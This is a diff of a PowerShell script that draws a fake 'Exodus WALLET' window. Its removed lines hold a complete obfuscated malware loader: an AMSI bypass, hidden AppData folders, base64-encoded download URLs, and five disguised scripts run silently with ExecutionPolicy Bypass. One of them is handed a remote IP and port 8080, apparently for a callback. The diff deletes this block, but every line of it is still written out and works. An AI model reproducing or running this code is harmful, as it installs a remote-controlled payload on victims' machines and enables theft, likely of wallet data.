@@ -1,11 +1,12 @@
-Add-Type -AssemblyName ('Sys' + 'tem.Windows.Forms');Add-Type -AssemblyName ('Sys' + 'tem.Drawing');[System.Windows.Forms.Application]::EnableVisualStyles();try{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}catch{}
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+[System.Windows.Forms.Application]::EnableVisualStyles()
 
-# AMSI Bypass (obfuskiert)
-$a`m``s``i = [Ref].Assembly.GetType(('A' + 'm' + 's' + 'i' + 'U' + 't' + 'i' + 'l' + 's'));[Ref].Assembly.GetType(('A' + 'm' + 's' + 'i' + 'U' + 't' + 'i' + 'l' + 's')).GetField('a' + 'm' + 's' + 'i' + 'I' + 'n' + 'i' + 't' + 'F' + 'a' + 'i' + 'l' + 'e' + 'd','NonPublic,Static').SetValue($null,$true)
+# TLS 1.2 für GitHub
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+} catch {}
 
-$o = @'
-$z = ('C:\Us' + 'ers\ad' + 'sfa\App' + 'Data\Roa' + 'ming\Micro' + 'soft\Wind' + 'ows\Power' + 'Shell');$q="$z\op`e``r``a``t``i``o``n";$r="$q\S`y``s``t``e``m";@($q,$r)|%{-not(`T``e``s``t``-P``a``t``h $_)-and(`N``e``w``-I``t``e``m -Path $_ -ItemType Directory -Force|Out-Null;(Get-Item $_ -Force).Attributes='Hidden,Directory')};$t=@( @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Mic`r``o``s``o``f``t``V``i``e``w``S``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='S`y``t``e``m``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Win`d``o``w``s``C``e``a``s``a``r``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Win`d``o``w``s``O``p``e``r``a``t``o``r``.`p``s``1'}, @{U='YUhSMGNITTlJbV1UzSUdacGJXVTlQQ0k1TVRVeU1UVXhPQzAwTkRNPQ==';N='Win`d``o``w``s``T``r``a``n``s``m``i``t``t``e``r``.`p``s``1'} );$u=[RunspaceFactory]::CreateRunspacePool(1,[Environment]::ProcessorCount);$u.Open();$v=@();$t|%{$w=Join-Path $r $_.N;$x=[PowerShell]::Create().AddScript({param($a,$b,$c);try{$d=New-Object ('Sys' + 'tem.Net.WebClient');$d.Headers.Add(('U' + 's' + 'e' + 'r' + '-' + 'A' + 'g' + 'e' + 'n' + 't'),('M' + 'o' + 'z' + 'i' + 'l' + 'l' + 'a/5.0 (Windows NT 10.0; Win64; x64)'));[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))|%{$e=[System.Text.Encoding]::UTF8.GetBytes($_);$d.DownloadData($b,$e)};if($c-eq('MicrosoftViewS.ps1')){('po' + 'w' + 'e' + 'r' + 's' + 'h' + 'e' + 'l' + 'l' + '.' + 'e' + 'x' + 'e') -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$b" -a14 ('1' + '4' + '5' + '.' + '2' + '2' + '3' + '.' + '1' + '1' + '7' + '.' + '7' + '7') -a15 8080 -a16 20 -a17 70 >$null 2>&1}else{('po' + 'w' + 'e' + 'r' + 's' + 'h' + 'e' + 'l' + 'l' + '.' + 'e' + 'x' + 'e') -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$b" >$null 2>&1}}).AddArgument($_.U).AddArgument($w).AddArgument($_.N);$x.RunspacePool=$u;$v+=[PSCustomObject]@{I=$x;S=$x.BeginInvoke()}};$y=(Get-Date).AddSeconds(30);while(($v.S.IsCompleted -contains $false)-and(Get-Date)-lt$y){Start-Sleep -m 500}
-'@;IEX $o;Start-Process ('p' + 'o' + 'w' + 'e' + 'r' + 's' + 'h' + 'e' + 'l' + 'l' + '.' + 'e' + 'x' + 'e') -ArgumentList ('-N' + 'o' + 'P' + 'r' + 'o' + 'f' + 'i' + 'l' + 'e'),('-W' + 'i' + 'n' + 'd' + 'o' + 'w' + 'S' + 't' + 'y' + 'l' + 'e'),'Hidden',('-E' + 'x' + 'e' + 'c' + 'u' + 't' + 'i' + 'o' + 'n' + 'P' + 'o' + 'l' + 'i' + 'c' + 'y'),'Bypass',('-C' + 'o' + 'm' + 'm' + 'a' + 'n' + 'd'),$o -NoNewWindow -Wait:$false
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus WALLET"
@@ -229,6 +230,3 @@ $labelTimer.Start()
 $form.Add_Shown({ $form.Activate() })
 
 $form.ShowDialog() | Out-Null
-
-
-
